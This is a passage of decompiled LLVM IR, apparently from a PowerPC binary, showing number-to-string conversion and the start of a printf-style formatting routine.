  uselistorder label %dec_label_pc_10010b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10010af0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010ad0, { 1, 0 }
  uselistorder label %dec_label_pc_10010a88, { 1, 0 }
  uselistorder label %dec_label_pc_10010a7c, { 1, 0 }
}

define i32 @function_10010b44(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10010b44:
  %v0_10010b44 = load i32, i32* @r5, align 4
  %v1_10010b44 = icmp slt i32 %v0_10010b44, 0
  %v1_10010b48 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10010b84 = icmp eq i32 %v1_10010b48, 0
  br i1 %v1_10010b44, label %dec_label_pc_10010b84, label %dec_label_pc_10010b50

dec_label_pc_10010b50:                            ; preds = %dec_label_pc_10010b44
  br i1 %v3_10010b84, label %dec_label_pc_10010b58, label %dec_label_pc_10010b8c

dec_label_pc_10010b58:                            ; preds = %dec_label_pc_10010b50
  %v3_10010b58 = icmp eq i32 %arg1, 256
  br i1 %v3_10010b58, label %dec_label_pc_10010b64, label %dec_label_pc_10010b6c

dec_label_pc_10010b64:                            ; preds = %dec_label_pc_10010b58
  br label %dec_label_pc_10010b78

dec_label_pc_10010b6c:                            ; preds = %dec_label_pc_10010b58
  %v3_10010b6c = icmp eq i32 %arg1, 512
  br i1 %v3_10010b6c, label %dec_label_pc_10010b74, label %dec_label_pc_10010b78

dec_label_pc_10010b74:                            ; preds = %dec_label_pc_10010b6c
  br label %dec_label_pc_10010b78

dec_label_pc_10010b78:                            ; preds = %dec_label_pc_10010b6c, %dec_label_pc_10010b64, %dec_label_pc_10010b74
  ret i32 0

dec_label_pc_10010b84:                            ; preds = %dec_label_pc_10010b44
  br i1 %v3_10010b84, label %dec_label_pc_10010b98, label %dec_label_pc_10010b8c

dec_label_pc_10010b8c:                            ; preds = %dec_label_pc_10010b50, %dec_label_pc_10010b84
  %v2_10010b8c = load i32, i32* %arg2, align 4
  ret i32 %v2_10010b8c

dec_label_pc_10010b98:                            ; preds = %dec_label_pc_10010b84
  %v3_10010b98 = icmp eq i32 %arg1, 256
  %v2_10010b9c = load i32, i32* %arg2, align 4
  br i1 %v3_10010b98, label %dec_label_pc_10010ba4, label %dec_label_pc_10010bac

dec_label_pc_10010ba4:                            ; preds = %dec_label_pc_10010b98
  %v1_10010ba4 = urem i32 %v2_10010b9c, 256
  br label %dec_label_pc_10010bb8

dec_label_pc_10010bac:                            ; preds = %dec_label_pc_10010b98
  %v3_10010bac = icmp eq i32 %arg1, 512
  br i1 %v3_10010bac, label %dec_label_pc_10010bb4, label %dec_label_pc_10010bb8

dec_label_pc_10010bb4:                            ; preds = %dec_label_pc_10010bac
  %v1_10010bb4 = mul i32 %v2_10010b9c, 65536
  %v2_10010bb4 = sdiv i32 %v1_10010bb4, 65536
  br label %dec_label_pc_10010bb8

dec_label_pc_10010bb8:                            ; preds = %dec_label_pc_10010bac, %dec_label_pc_10010ba4, %dec_label_pc_10010bb4
  %v0_10010bb8 = phi i32 [ %v2_10010b9c, %dec_label_pc_10010bac ], [ %v1_10010ba4, %dec_label_pc_10010ba4 ], [ %v2_10010bb4, %dec_label_pc_10010bb4 ]
  %tmp = icmp slt i32 %v0_10010bb8, 0
  %v1_10010bbc = zext i1 %tmp to i32
  %v2_10010bbc = ashr i32 %v0_10010bb8, 31
  %v3_10010bbc = and i32 %v2_10010bbc, -2
  %v4_10010bbc = or i32 %v3_10010bbc, %v1_10010bbc
  ret i32 %v4_10010bbc

; uselistorder directives
  uselistorder i32 %v0_10010bb8, { 1, 0 }
  uselistorder i32 %v2_10010b9c, { 2, 0, 1 }
  uselistorder i1 %v3_10010b84, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_10010bb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10010b78, { 2, 0, 1 }
}

define i32 @function_10010bc4(i16* %arg1) local_unnamed_addr {
dec_label_pc_10010bc4:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10010bc4 = load i32, i32* @r4, align 4
  %v3_10010bc4 = icmp eq i32 %v0_10010bc4, 256
  br i1 %v3_10010bc4, label %dec_label_pc_10010bd0, label %dec_label_pc_10010bd8

dec_label_pc_10010bd0:                            ; preds = %dec_label_pc_10010bc4
  %v0_10010bd0 = load i32, i32* @r6, align 4
  %v1_10010bd0 = trunc i32 %v0_10010bd0 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_10010bd0, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_10010bd8:                            ; preds = %dec_label_pc_10010bc4
  %v3_10010bc8 = icmp eq i32 %v0_10010bc4, 2048
  br i1 %v3_10010bc8, label %dec_label_pc_10010be0, label %dec_label_pc_10010bec

dec_label_pc_10010be0:                            ; preds = %dec_label_pc_10010bd8
  %v0_10010be0 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_10010be0, i32* %tmp2, align 4
  %v0_10010be4 = load i32, i32* @r6, align 4
  %v3_10010be4 = add i32 %tmp, 4
  %v4_10010be4 = inttoptr i32 %v3_10010be4 to i32*
  store i32 %v0_10010be4, i32* %v4_10010be4, align 4
  ret i32 %tmp

dec_label_pc_10010bec:                            ; preds = %dec_label_pc_10010bd8
  %v3_10010bd8 = icmp eq i32 %v0_10010bc4, 512
  %v0_10010bf0 = load i32, i32* @r6, align 4
  br i1 %v3_10010bd8, label %dec_label_pc_10010bf0, label %dec_label_pc_10010bf8

dec_label_pc_10010bf0:                            ; preds = %dec_label_pc_10010bec
  %v1_10010bf0 = trunc i32 %v0_10010bf0 to i16
  store i16 %v1_10010bf0, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10010bf8:                            ; preds = %dec_label_pc_10010bec
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10010bf0, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 1, 0, 2, 4 }
}

define i32 @function_10010c00(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10010c00:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10010c04 = load i32, i32* @r7, align 4
  %v3_10010c04 = icmp eq i32 %v0_10010c04, 0
  store i1 %v3_10010c04, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp13 = icmp sgt i32 %v0_10010c04, -1
  br i1 %tmp13, label %dec_label_pc_10010c34, label %dec_label_pc_10010c14

dec_label_pc_10010c14:                            ; preds = %dec_label_pc_10010c00
  %v0_10010c14 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010c18 = sub i32 0, %v0_10010c04
  store i32 %v1_10010c18, i32* @r7, align 4
  %tmp14 = icmp sgt i32 %v0_10010c14, -1
  br i1 %tmp14, label %dec_label_pc_10010c34, label %dec_label_pc_10010c20

dec_label_pc_10010c20:                            ; preds = %dec_label_pc_10010c14
  %v0_10010c20 = load i32, i32* %r6.global-to-local, align 4
  %v1_10010c20 = sub i32 0, %v0_10010c20
  %v2_10010c20 = sub i32 -1, %v0_10010c20
  store i32 %v1_10010c20, i32* %r6.global-to-local, align 4
  %v4_10010c20 = icmp uge i32 %v2_10010c20, %v1_10010c20
  %v1_10010c24 = sub i32 -1, %v0_10010c14
  %v3_10010c24 = zext i1 %v4_10010c20 to i32
  %v4_10010c24 = add i32 %v3_10010c24, %v1_10010c24
  store i32 %v4_10010c24, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010c34

dec_label_pc_10010c34:                            ; preds = %dec_label_pc_10010c00, %dec_label_pc_10010c14, %dec_label_pc_10010c20
  %v1_10010c38 = phi i32 [ %v1_10010c18, %dec_label_pc_10010c20 ], [ %v1_10010c18, %dec_label_pc_10010c14 ], [ %v0_10010c04, %dec_label_pc_10010c00 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10010c20 ], [ 0, %dec_label_pc_10010c14 ], [ 0, %dec_label_pc_10010c00 ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10010c38 = udiv i32 -1, %v1_10010c38
  store i32 %v2_10010c38, i32* @r8, align 4
  %v2_10010c40 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010c40 = inttoptr i32 %v2_10010c40 to i8*
  store i8 0, i8* %v3_10010c40, align 1
  %v0_10010c44 = load i32, i32* @r8, align 4
  %v1_10010c44 = load i32, i32* @r7, align 4
  %v2_10010c44 = mul i32 %v1_10010c44, %v0_10010c44
  %v1_10010c48 = sub i32 0, %v2_10010c44
  store i32 %v1_10010c48, i32* @r31, align 4
  %v4_10010c4c = icmp eq i32 %v1_10010c44, %v1_10010c48
  br i1 %v4_10010c4c, label %dec_label_pc_10010c54, label %dec_label_pc_10010c5c

dec_label_pc_10010c54:                            ; preds = %dec_label_pc_10010c34
  %v1_10010c54 = add i32 %v0_10010c44, 1
  store i32 %v1_10010c54, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10010c5c

dec_label_pc_10010c5c:                            ; preds = %dec_label_pc_10010c34, %dec_label_pc_10010c54
  %v0_10010c5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10010c5c, i32* %r12.global-to-local, align 4
  %v0_10010c60 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10010c60, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010c64

dec_label_pc_10010c64thread-pre-split:            ; preds = %dec_label_pc_10010cb8
  %v0_10010c64.pr = load i32, i32* %r12.global-to-local, align 4
  %v0_10010c68.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10010c68.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10010c64

dec_label_pc_10010c64:                            ; preds = %dec_label_pc_10010c64thread-pre-split, %dec_label_pc_10010c5c
  %v1_10010cac = phi i32 [ %v1_10010c68.pre, %dec_label_pc_10010c64thread-pre-split ], [ %v1_10010c44, %dec_label_pc_10010c5c ]
  %v1_10010cb0 = phi i32 [ %v0_10010c68.pre, %dec_label_pc_10010c64thread-pre-split ], [ %v0_10010c60, %dec_label_pc_10010c5c ]
  %v1_10010c80 = phi i32 [ %v0_10010c64.pr, %dec_label_pc_10010c64thread-pre-split ], [ %v0_10010c5c, %dec_label_pc_10010c5c ]
  %v3_10010c64 = icmp eq i32 %v1_10010c80, 0
  %v2_10010c68 = udiv i32 %v1_10010cb0, %v1_10010cac
  br i1 %v3_10010c64, label %dec_label_pc_10010cac, label %dec_label_pc_10010c70

dec_label_pc_10010c70:                            ; preds = %dec_label_pc_10010c64
  %v2_10010c70 = udiv i32 %v1_10010c80, %v1_10010cac
  %v2_10010c74 = mul i32 %v2_10010c68, %v1_10010cac
  %v2_10010c78 = mul i32 %v2_10010c70, %v1_10010cac
  %v2_10010c7c = sub i32 %v1_10010cb0, %v2_10010c74
  %v2_10010c80 = sub i32 %v1_10010c80, %v2_10010c78
  store i32 %v2_10010c70, i32* %r12.global-to-local, align 4
  %v0_10010c88 = load i32, i32* @r31, align 4
  %v2_10010c88 = mul i32 %v0_10010c88, %v2_10010c80
  %v0_10010c8c = load i32, i32* @r8, align 4
  %v2_10010c8c = mul i32 %v0_10010c8c, %v2_10010c80
  %v2_10010c90 = add i32 %v2_10010c88, %v2_10010c7c
  %v2_10010c94 = udiv i32 %v2_10010c90, %v1_10010cac
  %v2_10010c98 = add i32 %v2_10010c8c, %v2_10010c68
  %v2_10010c9c = mul i32 %v2_10010c94, %v1_10010cac
  %v2_10010ca0 = add i32 %v2_10010c94, %v2_10010c98
  store i32 %v2_10010ca0, i32* %r11.global-to-local, align 4
  %v2_10010ca4 = sub i32 %v2_10010c90, %v2_10010c9c
  store i32 %v2_10010ca4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010cb8

dec_label_pc_10010cac:                            ; preds = %dec_label_pc_10010c64
  %v2_10010cac = mul i32 %v2_10010c68, %v1_10010cac
  %v2_10010cb0 = sub i32 %v1_10010cb0, %v2_10010cac
  store i32 %v2_10010cb0, i32* %r5.global-to-local, align 4
  store i32 %v2_10010c68, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010cb8

dec_label_pc_10010cb8:                            ; preds = %dec_label_pc_10010c70, %dec_label_pc_10010cac
  %v1_10010cc0 = phi i32 [ %v2_10010c70, %dec_label_pc_10010c70 ], [ 0, %dec_label_pc_10010cac ]
  %v0_10010cc0 = phi i32 [ %v2_10010ca0, %dec_label_pc_10010c70 ], [ %v2_10010c68, %dec_label_pc_10010cac ]
  %v0_10010cc4 = phi i32 [ %v2_10010ca4, %dec_label_pc_10010c70 ], [ %v2_10010cb0, %dec_label_pc_10010cac ]
  %v1_10010cbc = load i32, i32* @r30, align 4
  %v2_10010cc0 = or i32 %v0_10010cc0, %v1_10010cc0
  %v5_10010cc0 = icmp eq i32 %v2_10010cc0, 0
  store i1 %v5_10010cc0, i1* %cr0_eq.global-to-local, align 1
  %v0_10010cc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010cc8 = add i32 %v0_10010cc8, -1
  store i32 %v1_10010cc8, i32* %r3.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10010cc4, 10
  %v1_10010cc4.v2_10010cbc.v = select i1 %tmp15, i32 48, i32 %v1_10010cbc
  %v1_10010cc4.v2_10010cbc = add i32 %v0_10010cc4, %v1_10010cc4.v2_10010cbc.v
  %extract.t10.extract.t = trunc i32 %v1_10010cc4.v2_10010cbc to i8
  %v3_10010cd8 = inttoptr i32 %v1_10010cc8 to i8*
  store i8 %extract.t10.extract.t, i8* %v3_10010cd8, align 1
  %v0_10010cdc = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10010cdc, label %dec_label_pc_10010ce0, label %dec_label_pc_10010c64thread-pre-split

dec_label_pc_10010ce0:                            ; preds = %dec_label_pc_10010cb8
  %v0_10010ce0 = load i32, i32* @r29, align 4
  %v3_10010ce0 = icmp eq i32 %v0_10010ce0, 0
  br i1 %v3_10010ce0, label %dec_label_pc_10010ce0.dec_label_pc_10010cf0_crit_edge, label %dec_label_pc_10010ce8

dec_label_pc_10010ce0.dec_label_pc_10010cf0_crit_edge: ; preds = %dec_label_pc_10010ce0
  %v0_10010cf8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010cf0

dec_label_pc_10010ce8:                            ; preds = %dec_label_pc_10010ce0
  %v2_10010cec = load i32, i32* %r3.global-to-local, align 4
  %v3_10010cec = add i32 %v2_10010cec, -1
  %v4_10010cec = inttoptr i32 %v3_10010cec to i8*
  store i8 45, i8* %v4_10010cec, align 1
  store i32 %v3_10010cec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010cf0

dec_label_pc_10010cf0:                            ; preds = %dec_label_pc_10010ce0.dec_label_pc_10010cf0_crit_edge, %dec_label_pc_10010ce8
  %v0_10010cf8 = phi i32 [ %v0_10010cf8.pre, %dec_label_pc_10010ce0.dec_label_pc_10010cf0_crit_edge ], [ %v3_10010cec, %dec_label_pc_10010ce8 ]
  ret i32 %v0_10010cf8

; uselistorder directives
  uselistorder i32 %v2_10010c94, { 1, 0 }
  uselistorder i32 %v2_10010c70, { 1, 2, 0 }
  uselistorder i32 %v2_10010c68, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10010cac, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10010c44, { 1, 2, 0 }
  uselistorder i32 %v0_10010c44, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10010cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10010cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10010c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10010c34, { 2, 1, 0 }
}

define i32 @function_10010cfc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10010cfc:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10010d00 = load i32, i32* @lr, align 4
  store i32 101, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10010d1c = add i32 %tmp, 11
  %v2_10010d1c = inttoptr i32 %v1_10010d1c to i8*
  %v3_10010d1c = load i8, i8* %v2_10010d1c, align 1
  %v4_10010d1c = zext i8 %v3_10010d1c to i32
  store i32 %v4_10010d1c, i32* %r31.global-to-local, align 4
  %v1_10010d24 = or i32 %v4_10010d1c, 32
  store i32 %v1_10010d24, i32* %r0.global-to-local, align 4
  %v1_10010d28 = icmp ult i32 %v1_10010d24, 97
  %v3_10010d28 = icmp eq i32 %v1_10010d24, 97
  store i1 %v1_10010d28, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010d28, i1* %cr7_eq.global-to-local, align 1
  %v1_10010d2c = add i32 %tmp, 4
  %v2_10010d2c = inttoptr i32 %v1_10010d2c to i32*
  %v3_10010d2c = load i32, i32* %v2_10010d2c, align 4
  store i32 %v3_10010d2c, i32* %r28.global-to-local, align 4
  %v2_10010d30 = load i32, i32* %arg2, align 4
  store i32 %v2_10010d30, i32* %r30.global-to-local, align 4
  br i1 %v3_10010d28, label %dec_label_pc_10010d38, label %dec_label_pc_10010d40

dec_label_pc_10010d38:                            ; preds = %dec_label_pc_10010cfc
  %v1_10010d38 = add nuw nsw i32 %v4_10010d1c, 6
  store i32 %v1_10010d38, i32* %r0.global-to-local, align 4
  %v1_10010d3c = urem i32 %v1_10010d38, 256
  store i32 %v1_10010d3c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010d40

dec_label_pc_10010d40:                            ; preds = %dec_label_pc_10010cfc, %dec_label_pc_10010d38
  %v0_10010df8 = phi i32 [ %v4_10010d1c, %dec_label_pc_10010cfc ], [ %v1_10010d3c, %dec_label_pc_10010d38 ]
  %v1_10010d40 = icmp slt i32 %v2_10010d30, 0
  %v3_10010d40 = icmp eq i32 %v2_10010d30, 0
  store i1 %v1_10010d40, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010d40, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10010d30, -1
  br i1 %tmp75, label %dec_label_pc_10010d4c, label %dec_label_pc_10010d48

dec_label_pc_10010d48:                            ; preds = %dec_label_pc_10010d40
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010d4c

dec_label_pc_10010d4c:                            ; preds = %dec_label_pc_10010d40, %dec_label_pc_10010d48
  %v0_10010f0444 = phi i32 [ %v2_10010d30, %dec_label_pc_10010d40 ], [ 6, %dec_label_pc_10010d48 ]
  %v1_10010d4c = add i32 %tmp, 12
  %v2_10010d4c = inttoptr i32 %v1_10010d4c to i32*
  %v3_10010d4c = load i32, i32* %v2_10010d4c, align 4
  store i32 %v3_10010d4c, i32* %r9.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  %v1_10010d58 = and i32 %v3_10010d4c, 2
  store i32 %v1_10010d58, i32* %r0.global-to-local, align 4
  %v3_10010d58 = icmp eq i32 %v1_10010d58, 0
  br i1 %v3_10010d58, label %dec_label_pc_10010d68, label %dec_label_pc_10010d74

dec_label_pc_10010d68:                            ; preds = %dec_label_pc_10010d4c
  %v1_10010d68 = urem i32 %v3_10010d4c, 2
  store i32 %v1_10010d68, i32* @r7, align 4
  %v3_10010d68 = icmp eq i32 %v1_10010d68, 0
  br i1 %v3_10010d68, label %dec_label_pc_10010d78, label %dec_label_pc_10010d74

dec_label_pc_10010d74:                            ; preds = %dec_label_pc_10010d68, %dec_label_pc_10010d4c
  %storemerge = phi i32 [ 43, %dec_label_pc_10010d4c ], [ 32, %dec_label_pc_10010d68 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10010d74 = trunc i32 %storemerge to i8
  store i8 %v6_10010d74, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10010d78

dec_label_pc_10010d78:                            ; preds = %dec_label_pc_10010d68, %dec_label_pc_10010d74
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10010d40, label %dec_label_pc_10010edc, label %dec_label_pc_10010df4

dec_label_pc_10010df4:                            ; preds = %dec_label_pc_10010d78
  %v1_10010df8 = icmp ult i32 %v0_10010df8, 96
  %v2_10010df8 = icmp ugt i32 %v0_10010df8, 96
  %v3_10010df8 = icmp eq i32 %v0_10010df8, 96
  store i1 %v1_10010df8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010df8, i1* %cr7_eq.global-to-local, align 1
  %v2_10010dfc = add i32 %tmp, 16
  %v3_10010dfc = inttoptr i32 %v2_10010dfc to i32*
  store i32 32, i32* %v3_10010dfc, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10010df8, label %dec_label_pc_10010e20, label %dec_label_pc_10010e14

dec_label_pc_10010e14:                            ; preds = %dec_label_pc_10010df4
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010e20

dec_label_pc_10010e20:                            ; preds = %dec_label_pc_10010df4, %dec_label_pc_10010e14
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1001a490.797 to i32), i32 8), %dec_label_pc_10010df4 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1001a490.797 to i32), i32 12), %dec_label_pc_10010e14 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1001a490.797 to i32), i32* %r9.global-to-local, align 4
  %v2_10010e2c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10010e2c, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100112cc

dec_label_pc_10010edc:                            ; preds = %dec_label_pc_10010d78
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10010ee0 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10010ee0, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10010f2c = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10010f00

dec_label_pc_10010f00:                            ; preds = %dec_label_pc_10010f80.dec_label_pc_10010f00_crit_edge, %dec_label_pc_10010edc
  %v0_10010f04 = phi i32 [ %v0_10010f04.pre, %dec_label_pc_10010f80.dec_label_pc_10010f00_crit_edge ], [ %v0_10010f0444, %dec_label_pc_10010edc ]
  %v3_10010f04 = call %0 @__asm_cror(i32 %v0_10010f04, i32 %tmp, i32 %v0_10010f04)
  %v0_10010f08 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10010f08, label %dec_label_pc_10010f1c, label %dec_label_pc_10010f30

dec_label_pc_10010f1c:                            ; preds = %dec_label_pc_10010f00
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010f30

dec_label_pc_10010f30:                            ; preds = %dec_label_pc_10010f00, %dec_label_pc_10010f1c
  %storemerge2 = phi i32 [ %v1_10010f2c, %dec_label_pc_10010f1c ], [ %tmp55, %dec_label_pc_10010f00 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10010f40 = load i32, i32* %r6.global-to-local, align 4
  %v1_10010f40 = add i32 %v0_10010f40, 9
  store i32 %v1_10010f40, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010f5c

dec_label_pc_10010f5c:                            ; preds = %dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge, %dec_label_pc_10010f30
  %v1_10010f64 = phi i32 [ %v1_10010f64.pre, %dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge ], [ %v1_10010f40, %dec_label_pc_10010f30 ]
  %v0_10010f60 = phi i32 [ %v0_10010f60.pre, %dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge ], [ 0, %dec_label_pc_10010f30 ]
  %v1_10010f5c = phi i32 [ %v1_10010f5c.pre, %dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge ], [ 10, %dec_label_pc_10010f30 ]
  %v1_10010f6c = phi i32 [ %v0_10010f5c.pre, %dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge ], [ %storemerge2, %dec_label_pc_10010f30 ]
  %v2_10010f5c = udiv i32 %v1_10010f6c, %v1_10010f5c
  store i32 %v2_10010f5c, i32* %r0.global-to-local, align 4
  %v1_10010f60 = add i32 %v0_10010f60, 1
  store i32 %v1_10010f60, i32* %r8.global-to-local, align 4
  %v2_10010f64 = sub i32 %v1_10010f64, %v1_10010f60
  store i32 %v2_10010f64, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10010f5c, -10
  store i32 %v2_10010f5c, i32* %r10.global-to-local, align 4
  %v2_10010f6c = add i32 %v1_10010f6c, 48
  %v1_10010f74 = add i32 %v2_10010f6c, %tmp76
  store i32 %v1_10010f74, i32* %r9.global-to-local, align 4
  %v1_10010f78 = trunc i32 %v1_10010f74 to i8
  %v3_10010f78 = inttoptr i32 %v2_10010f64 to i8*
  store i8 %v1_10010f78, i8* %v3_10010f78, align 1
  %v0_10010f7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010f7c = add i32 %v0_10010f7c, -1
  store i32 %v1_10010f7c, i32* %ctr.global-to-local, align 4
  %v2_10010f7c = icmp eq i32 %v1_10010f7c, 0
  br i1 %v2_10010f7c, label %dec_label_pc_10010f80, label %dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge

dec_label_pc_10010f5c.dec_label_pc_10010f5c_crit_edge: ; preds = %dec_label_pc_10010f5c
  %v0_10010f5c.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10010f5c.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10010f60.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10010f64.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010f5c

dec_label_pc_10010f80:                            ; preds = %dec_label_pc_10010f5c
  %v0_10010f80 = load i32, i32* %r7.global-to-local, align 4
  %v1_10010f80 = icmp slt i32 %v0_10010f80, 0
  %v3_10010f80 = icmp eq i32 %v0_10010f80, 0
  store i1 %v1_10010f80, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010f80, i1* %cr7_eq.global-to-local, align 1
  %v1_10010f84 = add i32 %v0_10010f80, 1
  store i32 %v1_10010f84, i32* %r7.global-to-local, align 4
  br i1 %v3_10010f80, label %dec_label_pc_10010f80.dec_label_pc_10010f00_crit_edge, label %dec_label_pc_10010f8c

dec_label_pc_10010f80.dec_label_pc_10010f00_crit_edge: ; preds = %dec_label_pc_10010f80
  %v0_10010f04.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010f00

dec_label_pc_10010f8c:                            ; preds = %dec_label_pc_10010f80
  %v0_10010f8c = load i32, i32* %r31.global-to-local, align 4
  %v1_10010f8c = icmp ult i32 %v0_10010f8c, 96
